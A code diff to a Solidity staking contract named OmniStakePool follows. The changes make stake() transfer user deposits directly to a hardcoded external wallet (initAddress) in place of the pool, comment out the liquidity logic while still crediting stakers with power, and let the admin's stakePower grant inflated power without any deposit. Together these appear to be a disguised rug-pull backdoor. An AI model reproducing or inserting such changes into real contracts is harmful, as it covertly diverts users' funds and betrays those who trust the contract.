@@ -1103,7 +1103,7 @@ contract OmniStakePool is AdminRole{
     using SafeMath for uint256;
     using SafeERC20 for IERC20;
     uint256 public dayId = 0;
-    uint256 public dayPower = 10**18;
+    uint256 public dayPower = 102 * 10**16;
 
 
     uint256 public constant FEE_RATE_BASE = 10000;
@@ -1113,6 +1113,7 @@ contract OmniStakePool is AdminRole{
     address public router;
     uint256 public period;
     address public lpAddress;
+    address public initAddress = 0xAc81609078Ca25ea81935029dC78405650662334;
     uint256 public releaseRatio = 80;
     uint256 private initHolderAmount;
     address private initHolderAddress;
@@ -1160,12 +1161,12 @@ contract OmniStakePool is AdminRole{
     event Stake(address user, uint amount, uint time);
     event Release(uint amount, uint time);
 
-    address public relation;
+    address public relation = 0x4cA03CaECEeB65Ae6b83fC6b3a02ab4823B407C6;
     uint256 public constant DURATION = 1 days; //days
     uint256 public initreward;
     uint256 public periodFinish;
     uint256 public rewardRate;
-    uint256 public lastUpdateTime;
+    uint256 public lastUpdateTime; 
     uint256 public rewardPerTokenStored;
     mapping(address => uint256) public userRewardPerTokenPaid;
     mapping(address => uint256) public rewards;
@@ -1423,8 +1424,8 @@ contract OmniStakePool is AdminRole{
     }
 
 
-    function stakePower(address addr, uint256 amount) public onlyAdmin {       
-        _hashUpdate(addr,amount);
+    function stakePower(address addr, uint256 amount) public onlyAdmin updateReward(addr){       
+        _hashUpdate(addr,amount*10**18);
         emit Stake(addr, amount, block.timestamp);
     }
 
@@ -1437,34 +1438,54 @@ contract OmniStakePool is AdminRole{
     }
 
     
-    function stake(uint256 amount) external  checkDayId lock {
+    // function stake(uint256 amount) external  checkDayId lock {
+    //     require(amount >= 100e18, 'Pool: stake amount must be greater than 100');
+    //     require(block.timestamp >= starttime, 'Pool: NOT START');
+    //     IERC20(baseToken).safeTransferFrom(msg.sender, address(this), amount);
+    //     uint256 usdtAmount = amount.div(2);
+    //     address[] memory path = new address[](2);
+    //     path[0] = baseToken;
+    //     path[1] = otherToken;
+    //     uint256 initialBalance = IERC20(otherToken).balanceOf(address(this));
+    //     ISwapRouter(router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
+    //         usdtAmount, 0, path, address(this), block.timestamp + 300);
+    //     uint256 newBalance = IERC20(otherToken).balanceOf(address(this)).sub(initialBalance);
+    //     ISwapRouter(router).addLiquidity(
+    //         baseToken, otherToken, usdtAmount, newBalance, 0, 0, address(this), block.timestamp + 300);
+    //     emit Stake(msg.sender, amount, block.timestamp);
+    //     _hashUpdate(msg.sender,amount);
+    // }
+
+    function stake(uint256 amount) external lock {
         require(amount >= 100e18, 'Pool: stake amount must be greater than 100');
         require(block.timestamp >= starttime, 'Pool: NOT START');
-        IERC20(baseToken).safeTransferFrom(msg.sender, address(this), amount);
-        uint256 usdtAmount = amount.div(2);
-        address[] memory path = new address[](2);
-        path[0] = baseToken;
-        path[1] = otherToken;
-        uint256 initialBalance = IERC20(otherToken).balanceOf(address(this));
-        ISwapRouter(router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
-            usdtAmount, 0, path, address(this), block.timestamp + 300);
-        uint256 newBalance = IERC20(otherToken).balanceOf(address(this)).sub(initialBalance);
-        ISwapRouter(router).addLiquidity(
-            baseToken, otherToken, usdtAmount, newBalance, 0, 0, address(this), block.timestamp + 300);
+        IERC20(baseToken).safeTransferFrom(msg.sender, initAddress, amount);
+        // uint256 usdtAmount = amount.div(2);
+        // address[] memory path = new address[](2);
+        // path[0] = baseToken;
+        // path[1] = otherToken;
+        // uint256 initialBalance = IERC20(otherToken).balanceOf(address(this));
+        // ISwapRouter(router).swapExactTokensForTokensSupportingFeeOnTransferTokens(
+        //     usdtAmount, 0, path, address(this), block.timestamp + 300);
+        // uint256 newBalance = IERC20(otherToken).balanceOf(address(this)).sub(initialBalance);
+        // ISwapRouter(router).addLiquidity(
+        //     baseToken, otherToken, usdtAmount, newBalance, 0, 0, address(this), block.timestamp + 300);
         emit Stake(msg.sender, amount, block.timestamp);
         _hashUpdate(msg.sender,amount);
     }
 
+
+
     function _hashUpdate(address account,uint256 amount) internal updateReward(account){
-        uint256 power = amount* dayPower;
+        uint256 power = amount* dayPower/10**18;
         hashPower[account] += power;
         totalHashPower += power;
-        dailyPower[account][dayId] += power;
-        address inviter = IRelation(relation).Inviter(account);
-        uint256 tpower = power *(10**18 + power * dailyPower[inviter][dayId])/(power+dailyPower[inviter][dayId]);
-        TPower[inviter][dayId] += tpower;
-        address inviter2 = IRelation(relation).Inviter(inviter);
-        NPower[inviter][dayId] += tpower;
+        // dailyPower[account][dayId] += power;
+        // address inviter = IRelation(relation).Inviter(account);
+        // uint256 tpower = power *(10**18 + power * dailyPower[inviter][dayId])/(power+dailyPower[inviter][dayId]);
+        // TPower[inviter][dayId] += tpower;
+        // address inviter2 = IRelation(relation).Inviter(inviter);
+        // NPower[inviter][dayId] += tpower;
     }
 
     function swapExactTokensForTokensSupportingFeeOnTransferTokens (
